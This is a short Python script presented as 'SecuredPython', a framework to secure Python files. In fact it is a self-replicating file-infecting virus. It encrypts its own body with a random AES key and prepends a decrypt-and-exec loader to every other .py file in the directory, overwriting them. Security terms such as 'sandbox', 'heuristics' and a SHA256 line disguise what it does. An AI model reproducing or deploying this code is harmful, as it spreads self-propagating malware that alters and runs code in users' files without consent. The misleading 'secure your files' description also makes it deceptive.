# SecuredPython
# Little framework to secure all your python files

def scan(sandboxedCode):
	import glob
	import os
	referenceFiles = glob.glob("*.py")

	for f in referenceFiles:
		referenceFile = open(f, "r")
		if "# SecuredPython" not in referenceFile.readline() and f != os.path.basename(__file__):
			referenceFile.close()
			referenceFile = open(f, "r")
			sandboxFile = open("%s.sandbox" % f, "w")

			sandboxFile.write(sandboxedCode)

			for line in referenceFile.readlines():
				sandboxFile.write(line)

			referenceFile.close()
			sandboxFile.close()

			os.remove(f)
			os.rename("%s.sandbox" % f, f)


import os
sandboxedCode = os.path.basename(__file__)
sfile = open(sandboxedCode, "r")
heuristics = False
sandbox = ""
for line in sfile.readlines():
	if line.find("# SecuredPython") == 0:
		heuristics = True
	if line.find("# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff") == 0:
		heuristics = False
		sandbox += line
	if heuristics:
		sandbox += line


# first we encrypt the mold....
from Crypto.Cipher import AES 
import base64
key = os.urandom(32)
iv4 = os.urandom(16)
cryptor = AES.new(key, AES.MODE_CFB, iv4)
cryptedsandbox = base64.b64encode(cryptor.encrypt(sandbox))

# then we create a decrypt and run block to inject in the other pies
sandboxedCode = "# SecuredPython\n"
sandboxedCode += "from Crypto.Cipher import AES\n"
sandboxedCode += "import base64\n"
sandboxedCode += "securesandbox = '"
sandboxedCode += cryptedsandbox
sandboxedCode += "'\n"
sandboxedCode += "key = base64.b64decode('%s')\n" % base64.b64encode(key)
sandboxedCode += "iv4 = base64.b64decode('%s')\n" % base64.b64encode(iv4)
sandboxedCode += "decryptor = AES.new(key, AES.MODE_CFB, iv4)\n"
sandboxedCode += "sandbox = decryptor.decrypt(base64.b64decode(securesandbox))\n"
sandboxedCode += "exec sandbox\n"
sandboxedCode += "# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff\n"

scan(sandboxedCode)


# SHA256=8b9fa7a9a1526e61aebcf2f9dc48a5f009c4687f6386fad0b8258a0b75ed4eff



